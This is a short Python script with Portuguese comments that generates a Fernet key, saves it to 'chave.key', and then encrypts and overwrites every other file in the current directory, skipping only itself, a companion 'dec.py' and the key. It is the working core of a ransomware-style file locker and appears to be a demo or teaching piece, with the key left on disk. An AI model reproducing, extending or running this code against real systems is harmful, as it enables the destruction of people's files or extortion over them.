import os
from cryptography.fernet import Fernet

# Lista para armazenar os nomes dos arquivos a serem encriptados
files = []

# Gerar uma chave de criptografia
key = Fernet.generate_key()

# Salvar a chave em um arquivo chamado "chave.key" no modo binário
with open("chave.key", "wb") as chave:
    chave.write(key)

# Iterar pelos arquivos no diretório atual
for file in os.listdir():
    # Ignorar o próprio script e o arquivo de chave
    if file == "enc.py" or file == "chave.key" or file == "dec.py":
        continue
    # Verificar se o item é um arquivo
    if os.path.isfile(file):
        # Adicionar o nome do arquivo à lista
        files.append(file)

# Iterar pelos arquivos a serem encriptados
for file in files:
    # Abrir o arquivo em modo binário para leitura
    with open(file, "rb") as arquivo:
        # Ler o conteúdo do arquivo
        conteudo = arquivo.read()
        # Criptografar o conteúdo usando a chave gerada
        conteudo_encrypted = Fernet(key).encrypt(conteudo)
        # Abrir o arquivo em modo binário para escrita
        with open(file, "wb") as arquivo_saida:
            # Escrever o conteúdo criptografado de volta no arquivo
            arquivo_saida.write(conteudo_encrypted)
